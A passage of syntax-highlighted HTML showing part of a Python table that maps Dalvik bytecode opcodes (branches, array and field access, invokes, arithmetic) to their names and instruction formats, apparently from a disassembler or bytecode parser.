(<span class="string">&quot;if-ge&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x36</span>: (<span class="string">&quot;if-gt&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x37</span>: (<span class="string">&quot;if-le&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x38</span>: (<span class="string">&quot;if-eqz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x39</span>: (<span class="string">&quot;if-nez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3a</span>: (<span class="string">&quot;if-ltz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3b</span>: (<span class="string">&quot;if-gez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3c</span>: (<span class="string">&quot;if-gtz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3d</span>: (<span class="string">&quot;if-lez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x44</span>: (<span class="string">&quot;aget&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x45</span>: (<span class="string">&quot;aget-wide&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x46</span>: (<span class="string">&quot;aget-object&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x47</span>: (<span class="string">&quot;aget-boolean&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x48</span>: (<span class="string">&quot;aget-byte&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x49</span>: (<span class="string">&quot;aget-char&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4a</span>: (<span class="string">&quot;aget-short&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4b</span>: (<span class="string">&quot;aput&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4c</span>: (<span class="string">&quot;aput-wide&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4d</span>: (<span class="string">&quot;aput-object&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4e</span>: (<span class="string">&quot;aput-boolean&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4f</span>: (<span class="string">&quot;aput-byte&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x50</span>: (<span class="string">&quot;aput-char&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x51</span>: (<span class="string">&quot;aput-short&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x52</span>: (<span class="string">&quot;iget&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x53</span>: (<span class="string">&quot;iget-wide&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x54</span>: (<span class="string">&quot;iget-object&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x55</span>: (<span class="string">&quot;iget-boolean&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x56</span>: (<span class="string">&quot;iget-byte&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x57</span>: (<span class="string">&quot;iget-char&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x58</span>: (<span class="string">&quot;iget-short&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x59</span>: (<span class="string">&quot;iput&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5a</span>: (<span class="string">&quot;iput-wide&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5b</span>: (<span class="string">&quot;iput-object&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5c</span>: (<span class="string">&quot;iput-boolean&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5d</span>: (<span class="string">&quot;iput-byte&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5e</span>: (<span class="string">&quot;iput-char&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5f</span>: (<span class="string">&quot;iput-short&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x60</span>: (<span class="string">&quot;sget&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x61</span>: (<span class="string">&quot;sget-wide&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x62</span>: (<span class="string">&quot;sget-object&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x63</span>: (<span class="string">&quot;sget-boolean&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x64</span>: (<span class="string">&quot;sget-byte&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x65</span>: (<span class="string">&quot;sget-char&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x66</span>: (<span class="string">&quot;sget-short&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x67</span>: (<span class="string">&quot;sput&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x68</span>: (<span class="string">&quot;sput-wide&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x69</span>: (<span class="string">&quot;sput-object&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6a</span>: (<span class="string">&quot;sput-boolean&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6b</span>: (<span class="string">&quot;sput-byte&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6c</span>: (<span class="string">&quot;sput-char&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6d</span>: (<span class="string">&quot;sput-short&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x6e</span>: (<span class="string">&quot;invoke-virtual&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6f</span>: (<span class="string">&quot;invoke-super&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x70</span>: (<span class="string">&quot;invoke-direct&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x71</span>: (<span class="string">&quot;invoke-static&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x72</span>: (<span class="string">&quot;invoke-interface&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x74</span>: (<span class="string">&quot;invoke-virtual/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x75</span>: (<span class="string">&quot;invoke-super/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x76</span>: (<span class="string">&quot;invoke-direct/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x77</span>: (<span class="string">&quot;invoke-static/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x78</span>: (<span class="string">&quot;invoke-interface/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x7b</span>: (<span class="string">&quot;neg-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7c</span>: (<span class="string">&quot;not-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7d</span>: (<span class="string">&quot;neg-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7e</span>: (<span class="string">&quot;not-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7f</span>: (<span class="string">&quot;neg-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x80</span>: (<span class="string">&quot;neg-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x81</span>: (<span class="string">&quot;int-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x82</span>: (<span class="string">&quot;int-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x83</span>: (<span class="string">&quot;int-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x84</span>: (<span class="string">&quot;long-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x85</span>: (<span class="string">&quot;long-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x86</span>: (<span class="string">&quot;long-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x87</span>: (<span class="string">&quot;float-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x88</span>: (<span class="string">&quot;float-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x89</span>: (<span class="string">&quot;float-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8a</span>: (<span class="string">&quot;double-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8b</span>: (<span class="string">&quot;double-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8c</span>: (<span class="string">&quot;double-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8d</span>: (<span class="string">&quot;int-to-byte&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8e</span>: (<span class="string">&quot;int-to-char&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8f</span>: (<span class="string">&quot;int-to-short&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x90</span>: (<span class="string">&quot;add-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x91</span>: (<span class="string">&quot;sub-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x92</span>: (<span class="string">&quot;mul-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x93</span>: (<span class="string">&quot;div-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x94</span>: (<span class="string">&quot;rem-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x95</span>: (<span class="string">&quot;and-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x96</span>: (<span class="string">&quot;or-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x97</span>: (<span class="string">&quot;xor-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x98</span>: (<span class="string">&quot;shl-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x99</span>: (<span class="string">&quot;shr-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9a</span>: (<span class="string">&quot;ushr-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x9b</span>: (<span class="string">&quot;add-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9c</span>: (<span class="string">&quot;sub-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9d</span>: (<span class="string">&quot;mul-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9e</span>: (<span class="string">&quot;div-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9f</span>: (<span class="string">&quot;rem-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa0</span>: (<span class="string">&quot;and-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa1</span>: (<span class="string">&quot;or-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa2</span>: (<span class="string">&quot;xor-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa3</span>: (<span class="string">&quot;shl-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa4</span>: (<span class="string">&quot;shr-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa5</span>: (<span class="string">&quot;ushr-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xa6</span>: (<span class="string">&quot;add-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa7</span>: (<span class="string">&quot;sub-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa8</span>: (<span class="string">&quot;mul-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa9</span>: (<span class="string">&quot;div-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xaa</span>: (<span class="string">&quot;rem-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xab</span>: (<span class="string">&quot;add-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xac</span>: (<span class="string">&quot;sub-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xad</span>: (<span class="string">&quot;mul-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xae</span>: (<span class="string">&quot;div-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xaf</span>: (<span class="string">&quot;rem-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xb0</span>: (<span class="string">&quot;add-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb1</span>: (<span class="string">&quot;sub-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb2</span>: (<span class="string">&quot;mul-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb3</span>: (<span class="string">&quot;div-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb4</span>: (<span class="string">&quot;rem-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb5</span>: (<span class="string">&quot;and-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb6</span>: (<span class="string">&quot;or-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb7</span>: (<span class="string">&quot;xor-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb8</span>: (<span class="string">&quot;shl-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xb9</span>: (<span class="string">&quot;shr-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xba</span>: (<span class="string">&quot;ushr-int/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xbb</span>: (<span class="string">&quot;add-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbc</span>: (<span class="string">&quot;sub-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbd</span>: (<span class="string">&quot;mul-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbe</span>: (<span class="string">&quot;div-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xbf</span>: (<span class="string">&quot;rem-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc0</span>: (<span class="string">&quot;and-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc1</span>: (<span class="string">&quot;or-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc2</span>: (<span class="string">&quot;xor-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc3</span>: (<span class="string">&quot;shl-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc4</span>: (<span class="string">&quot;shr-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc5</span>: (<span class="string">&quot;ushr-long/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xc6</span>: (<span class="string">&quot;add-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc7</span>: (<span class="string">&quot;sub-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc8</span>: (<span class="string">&quot;mul-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xc9</span>: (<span class="string">&quot;div-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xca</span>: (<span class="string">&quot;rem-float/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xcb</span>: (<span class="string">&quot;add-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcc</span>: (<span class="string">&quot;sub-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcd</span>: (<span class="string">&quot;mul-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xce</span>: (<span class="string">&quot;div-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xcf</span>: (<span class="string">&quot;rem-double/2addr&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xd0</span>: (<span class="string">&quot;add-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd1</span>: (<span class="string">&quot;rsub-int&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd2</span>: (<span class="string">&quot;mul-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd3</span>: (<span class="string">&quot;div-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd4</span>: (<span class="string">&quot;rem-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd5</span>: (<span class="string">&quot;and-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd6</span>: (<span class="string">&quot;or-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd7</span>: (<span class="string">&quot;xor-int/lit16&quot;</span>, <span class="string">&quot;22s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xd8</span>: (<span class="string">&quot;add-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xd9</span>: (<span class="string">&quot;rsub-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xda</span>: (<span class="string">&quot;mul-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdb</span>: (<span class="string">&quot;div-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdc</span>: (<span class="string">&quot;rem-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdd</span>: (<span class="string">&quot;and-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span 